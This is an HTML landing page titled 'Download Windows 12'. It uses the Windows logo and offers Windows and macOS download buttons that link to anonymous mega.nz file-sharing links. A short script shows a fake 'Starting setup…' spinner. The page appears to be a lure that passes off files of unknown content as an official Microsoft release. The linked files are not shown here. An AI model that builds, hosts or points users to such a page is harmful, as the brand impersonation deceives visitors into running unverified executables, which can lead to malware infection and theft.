<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Download Windows 12</title>

<style>
/* RESET */
* { margin: 0; padding: 0; box-sizing: border-box; }

/* BODY & BACKGROUND */
body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
    overflow: hidden;
}

/* BACKGROUND LAYER */
body::before {
    content: '';
    position: fixed;
    inset: 0;
    background: linear-gradient(
        135deg,
        #667eea 0%,
        #764ba2 25%,
        #f093fb 50%,
        #4facfe 75%,
        #00f2fe 100%
    );
    background-size: 400% 400%;
    animation: gradientShift 15s ease infinite;
    z-index: -2;
}

@keyframes gradientShift {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
}

/* FLOATING LIGHTS */
body::after {
    content: '';
    position: fixed;
    inset: 0;
    background:
        radial-gradient(circle at 20% 50%, rgba(255,255,255,0.1) 0%, transparent 50%),
        radial-gradient(circle at 80% 80%, rgba(255,255,255,0.1) 0%, transparent 50%),
        radial-gradient(circle at 40% 20%, rgba(255,255,255,0.1) 0%, transparent 50%);
    animation: float 20s ease-in-out infinite;
    z-index: -1;
}

@keyframes float {
    0%,100% { transform: translateY(0px) rotate(0deg); }
    50% { transform: translateY(-20px) rotate(5deg); }
}

/* MAIN CONTAINER */
.container {
    z-index: 1;
    text-align: center;
    background: rgba(255,255,255,0.15);
    backdrop-filter: blur(12px);
    border-radius: 22px;
    padding: 40px;
    box-shadow: 0 10px 35px rgba(0,0,0,0.35);
    border: 1px solid rgba(255,255,255,0.2);
}

/* TITLE */
.title {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 16px;
    margin-bottom: 30px;
}

.title img { width: 52px; height: 52px; }

h1 {
    color: white;
    font-size: 32px;
    text-shadow: 2px 2px 6px rgba(0,0,0,0.35);
}

/* BUTTONS */
.buttons {
    display: flex;
    gap: 22px;
    justify-content: center;
    flex-wrap: wrap;
}

a.button {
    position: relative;
    text-decoration: none;
    padding: 16px 34px;
    border-radius: 14px;
    font-size: 16px;
    font-weight: bold;
    color: white;
    background: linear-gradient(135deg, #667eea, #764ba2);
    box-shadow: 0 8px 18px rgba(0,0,0,0.25);
    transition: transform 0.25s ease, box-shadow 0.25s ease;
    overflow: hidden;
    z-index: 1;
}

a.button.mac { background: linear-gradient(135deg, #444, #777); }

a.button::before {
    content: "";
    position: absolute;
    top: 0;
    left: -120%;
    width: 120%;
    height: 100%;
    background: linear-gradient(
        120deg,
        transparent,
        rgba(255,255,255,0.55),
        transparent
    );
    transition: left 0.6s ease;
}

a.button:hover::before { left: 120%; }
a.button:hover { transform: translateY(-6px) scale(1.08); box-shadow: 0 14px 34px rgba(0,0,0,0.45); }
a.button:active { transform: scale(0.96); }

/* OVERLAY */
#overlay {
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.35);
    backdrop-filter: blur(6px);
    opacity: 0;
    pointer-events: none;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: opacity 0.3s ease;
    z-index: 100;
}

/* SETUP WINDOW */
.setup-box {
    background: rgba(255,255,255,0.95);
    padding: 32px 44px;
    border-radius: 20px;
    text-align: center;
    box-shadow: 0 20px 45px rgba(0,0,0,0.4);
    animation: popIn 0.35s ease;
}

@keyframes popIn {
    from { transform: scale(0.85); opacity: 0; }
    to { transform: scale(1); opacity: 1; }
}

.spinner {
    width: 48px;
    height: 48px;
    border: 5px solid #ddd;
    border-top: 5px solid #667eea;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin: 0 auto 16px;
}

@keyframes spin { to { transform: rotate(360deg); } }

.setup-text { font-size: 18px; font-weight: bold; }
</style>
</head>

<body>

<div class="container">
    <div class="title">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/Windows_logo_-_2021.svg">
        <h1>Download Windows 12</h1>
    </div>

    <div class="buttons">
        <a class="button" href="https://mega.nz/file/aQwizSwK#sRyJq-arD0X7G5JD5wTnBAruo_Oe_mycqe35nHEwrus">Download for Windows</a>
        <a class="button mac" href="https://mega.nz/file/WJYjQLzB#scMbCylin7TLXUvYS73o4FeDmEHLDwG_WawwlIreHPo">Download for macOS</a>
    </div>
</div>

<div id="overlay">
    <div class="setup-box">
        <div class="spinner"></div>
        <div class="setup-text">Starting setup…</div>
    </div>
</div>

<script>
document.querySelectorAll(".button").forEach(btn => {
    btn.addEventListener("click", () => {
        const overlay = document.getElementById("overlay");
        overlay.classList.add("active");
        setTimeout(() => { overlay.classList.remove("active"); }, 1200);
    });
});
</script>

</body>
</html>
